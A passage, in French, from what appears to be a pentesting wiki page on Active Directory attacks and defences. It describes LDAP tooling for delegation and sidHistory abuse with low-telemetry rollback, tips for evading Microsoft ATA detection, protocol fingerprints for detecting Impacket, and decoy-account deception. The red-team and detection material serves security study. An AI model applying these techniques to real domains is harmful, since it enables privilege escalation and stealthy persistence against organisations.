- Les macros de délégation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) réécrivent `msDS-AllowedToDelegateTo`, les indicateurs UAC ou `msDS-AllowedToActOnBehalfOfOtherIdentity` depuis le beacon, permettant les chemins d’attaque constrained/unconstrained/RBCD et supprimant le besoin de PowerShell distant ou de RSAT.

### Injection de sidHistory, déplacement d’OU et modelage de la surface d’attaque

- `add-sidhistory` injecte des SID privilégiés dans l’historique SID d’un principal contrôlé (voir [SID-History Injection](sid-history-injection.md)), fournissant un héritage d’accès furtif entièrement via LDAP/LDAPS.
- `move-object` modifie le DN/OU des ordinateurs ou des utilisateurs, permettant à un attaquant de déplacer des actifs vers des OU où des droits délégués existent déjà avant d’abuser de `set-password`, `add-groupmember` ou `add-spn`.
- Des commandes de suppression strictement ciblées (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permettent un rollback rapide après la collecte des identifiants ou la mise en place de la persistance par l’opérateur, en minimisant la télémétrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Quelques défenses générales

[**En savoir plus sur la protection des identifiants ici.**](../stealing-credentials/credentials-protections.md)

### **Mesures défensives pour la protection des identifiants**

- **Restrictions des Domain Admins** : il est recommandé que les Domain Admins ne puissent se connecter qu’aux Domain Controllers, afin d’éviter leur utilisation sur d’autres hôtes.
- **Privilèges des comptes de service** : les services ne doivent pas être exécutés avec des privilèges de Domain Admin (DA) afin de préserver la sécurité.
- **Limitation temporelle des privilèges** : pour les tâches nécessitant des privilèges DA, leur durée doit être limitée. Cela peut être réalisé avec : `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Atténuation des LDAP relay** : auditer les Event IDs 2889/3074/3075, puis imposer la signature LDAP ainsi que le channel binding LDAPS sur les DC/clients afin de bloquer les tentatives de LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting au niveau protocolaire de l’activité d’Impacket

Si vous souhaitez détecter les tradecraft AD courants, **ne vous fiez pas uniquement aux artefacts contrôlés par l’opérateur**, tels que les binaires renommés, les noms de services, les fichiers batch temporaires ou les chemins de sortie. Établissez une baseline de la manière dont les clients Windows légitimes construisent le trafic [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC et WMI, puis recherchez les **particularités d’implémentation** qui subsistent même après la modification par l’opérateur de `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` ou `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Candidats autonomes à haute fiabilité** (après validation avec votre propre baseline) :
- DCE/RPC authentifié utilisant `auth_context_id = 79231 + ctx_id`
- Padding d’authentification DCE/RPC rempli avec `0xff`
- Binds LDAP Kerberos plaçant un `AP-REQ` Kerberos brut directement dans `mechToken` SPNEGO
- Requêtes de négociation SMB2/3 avec des valeurs de `ClientGuid` ressemblant à de l’ASCII
- WMI `IWbemLevel1Login::NTLMLogin` utilisant l’espace de noms non standard `//./root/cimv2`
- Valeurs de nonce Kerberos codées en dur
- **À utiliser plutôt comme fonctionnalités de corrélation/score** :
- Listes d’etype Kerberos clairsemées ou dupliquées, `PA-DATA` inhabituels/manquants, ou ordre des etype dans les TGS-REQ différent de celui de Windows natif
- Messages NTLM Type 1 sans informations de version ou messages Type 3 avec des noms d’hôte nuls
- NTLMSSP brut transporté dans DCE/RPC au lieu de SPNEGO, trailers de vérification DCE/RPC manquants, ou discordances d’OID SPNEGO/Kerberos
- Plusieurs de ces caractéristiques provenant du même hôte/utilisateur/session/fenêtre temporelle sont bien plus probantes qu’un seul champ faible
- **À utiliser comme enrichissement, et non comme alertes autonomes** :
- Noms de fichiers par défaut, chemins de sortie, noms de services aléatoires, noms de fichiers batch temporaires, noms de comptes d’ordinateur par défaut et chaînes HTTP/WebDAV/RDP/MSSQL spécifiques aux outils
- Ces éléments sont faciles à modifier pour les opérateurs et servent surtout à expliquer pourquoi un cluster interprotocole est suspect
- **Notes opérationnelles** :
- Certains de ces signaux nécessitent du trafic déchiffré, l’analyse [PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW ou une visibilité côté service
- Valider avec des clients Samba/Linux, des appliances et des logiciels legacy avant de transformer ces signaux en alertes
- Faire évoluer les détections de l’enrichissement -> hunting -> alerting à mesure que la confiance dans la baseline augmente

### **Mise en œuvre des techniques de deception**

- La mise en œuvre de deception consiste à installer des pièges, comme des utilisateurs ou des ordinateurs leurres, avec des caractéristiques telles que des mots de passe qui n’expirent jamais ou des comptes marqués comme Trusted for Delegation. Une approche détaillée comprend la création d’utilisateurs avec des droits spécifiques ou leur ajout à des groupes à privilèges élevés.<sup>[[2]](#references)</sup>
- Un exemple pratique consiste à utiliser des outils tels que : `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Plus d’informations sur le déploiement des techniques de deception sont disponibles sur [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identification de la deception**

- **Pour les objets utilisateur** : les indicateurs suspects comprennent un ObjectSID atypique, des connexions peu fréquentes, des dates de création inhabituelles et un faible nombre de mots de passe incorrects.
- **Indicateurs généraux** : la comparaison des attributs d’objets leurres potentiels avec ceux d’objets légitimes peut révéler des incohérences. Des outils comme [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) peuvent aider à identifier ces deceptive objects.

### **Contournement des systèmes de détection**

- **Contournement de la détection Microsoft ATA** :
- **Énumération des utilisateurs** : éviter l’énumération des sessions sur les Domain Controllers afin d’empêcher la détection par ATA.
- **Usurpation de tickets** : utiliser des clés **aes** pour créer les tickets aide à échapper à la détection en évitant une rétrogradation vers NTLM.
- **Attaques DCSync** : il est recommandé de les exécuter depuis un hôte qui n’est pas un Domain Controller afin d’éviter la détection par ATA, car une exécution directe depuis un Domain Controller déclenchera des alertes.

## References

- [1] [Guide de l’attaque des trusts de domaine](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Falsification des trusts pour la deception dans Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [De Domain Admin à Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Collection de LDAP BOF – Toolkit LDAP en mémoire pour l’exploitation d’Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck ! Transformer des hashes NTLM en wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [CTF Barbhack 2025 (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Analyse d’Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Prise de contrôle de comptes Active Directory via Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Comment gérer les modifications des connexions de channel sécurisé Netlogon associées à CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Une exploration des interfaces Null Session et MS-RPC oubliées](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Le filtre SID comme frontière de sécurité entre domaines ? (Partie 4) - Recherche sur le contournement du filtrage SID](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Le filtre SID comme frontière de sécurité entre domaines ? (Partie 5) - Attaque Golden GMSA trust - de l’enfant vers le parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Le filtre SID comme frontière de sécurité entre domaines ? (Partie 6) - Attaque Schema change trust - de l’enfant vers le parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [De DA à EA avec ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Passer des admins d’un domaine enfant aux admins d’entreprise en 5 minutes en abusant d’AD CS, suite](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Un ACE dans sa manche : concevoir des backdoors DACL Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Code source du module pre2k de NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - attribut msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
